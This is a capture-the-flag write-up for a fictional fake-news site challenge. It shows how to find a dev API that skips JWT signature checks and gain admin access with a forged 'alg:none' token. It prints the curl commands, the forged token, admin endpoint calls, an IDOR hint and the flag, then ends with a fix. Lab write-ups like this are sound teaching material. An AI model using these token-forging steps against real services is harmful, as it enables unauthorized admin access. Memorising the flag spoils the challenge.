#### Challenge:

Hi Senior Researcher,

an unknown perpetrator is attempting to discredit the national research and education network (NREN) and, on their domain theylietoyou.tcc, is publishing entirely unverified hoaxes, fake news, and other thoroughly unscientific content aimed against the mission of the NREN.

Law enforcement authorities have already been informed and they could use your assistance to gather as much information as possible. More information can be found on the website http://theylietoyou.tcc/story-line.

Stay curious!

---

#### Solution:

Chapter 1 ended on a planted lead. The flag there lived in the backend's exposed OpenAPI spec
(`/v3/api-docs`), inside the `TokenResponse` schema description, which also said: *"This JWT is also
very important for our DEV environment (`untraceable-dev.theylietoyou.tcc`)!"* The "owner" is the
site's `admin`, so the task is to escalate to `ADMIN` — and the dev environment is where the amateur
dev slipped.

**1. Follow the trail to the dev frontend, then its API.** The dev SPA
`http://untraceable-dev.theylietoyou.tcc` is another Vite/React build; its bundle names the dev API
host:

```bash
curl -s http://untraceable-dev.theylietoyou.tcc/assets/index-Ye1zfFzV.js \
  | grep -oE 'https?://[a-zA-Z0-9.-]+' | sort -u | grep theylietoyou
# http://untraceable-dev-api.theylietoyou.tcc
```

**2. Spot the broken auth.** On **prod** the JWT is verified properly — any tampered signature is
rejected with `401`. On **dev** the API does **not verify the signature at all**: it simply trusts
the `role` claim. A token with a garbage signature is accepted on protected dev endpoints (`200`),
while the identical request to prod returns `401`:

```bash
# newWarrior AUTHOR token with its last signature byte mangled:
BAD="<valid-header>.<valid-payload>.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
curl -s -o /dev/null -w "dev=%{http_code}\n"  http://untraceable-dev-api.theylietoyou.tcc/api/profile -H "Authorization: Bearer $BAD"   # 200
curl -s -o /dev/null -w "prod=%{http_code}\n" http://api.theylietoyou.tcc/api/profile            -H "Authorization: Bearer $BAD"   # 401
```

**3. Forge an `alg:none` admin token and read the flag.** No signature, `role: ADMIN`, `sub: 1`
(the owner):

```bash
H=$(printf '{"alg":"none"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=')
P=$(printf '{"sub":"1","role":"ADMIN","username":"admin"}' | openssl base64 -A | tr '+/' '-_' | tr -d '=')
curl -s http://untraceable-dev-api.theylietoyou.tcc/api/admin/flag -H "Authorization: Bearer $H.$P."
# {"flag":"FLAG{nJd3-nn70-B55u-ld34}"}
```

The minimal forged token is:
`eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6IkFETUlOIiwidXNlcm5hbWUiOiJhZG1pbiJ9.`

**Bonus — meet the owner and grab the next clue.** The same forged admin token unlocks the rest of
`/api/admin/*` on dev:

```bash
A="Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6IkFETUlOIiwidXNlcm5hbWUiOiJhZG1pbiJ9."
curl -s http://untraceable-dev-api.theylietoyou.tcc/api/admin/users -H "$A"   # owner = admin (userId 1, admin@theylietoyou.tcc)
curl -s http://untraceable-dev-api.theylietoyou.tcc/api/admin/conf  -H "$A"
```

`/api/admin/conf` leaks the metadata-addressing scheme used by
`GET /api/admin/users/{userId}/meta/{metaId}`:

```json
{"formula":"metaId = baseOffset + (userId * multiplier) + fieldOffset",
 "offsets":{"FirstName":11,"LastName":17,"Email":23,"Address":41,"Sex":53,"Data":99},
 "multiplier":1000,"baseOffset":154700}
```

So the owner's hidden `Data` metadata sits at `metaId = 154700 + 1*1000 + 99 = 155799` — the IDOR
lead that seeds the next chapter.

**Fix:** non-prod environments must enforce the *same* JWT signature verification as prod and must
reject `alg:none`; a token issued by one environment should never be implicitly trusted by a laxer
one.

---

<details><summary>FLAG:</summary>

```
FLAG{nJd3-nn70-B55u-ld34}
```

</details>
<br/>
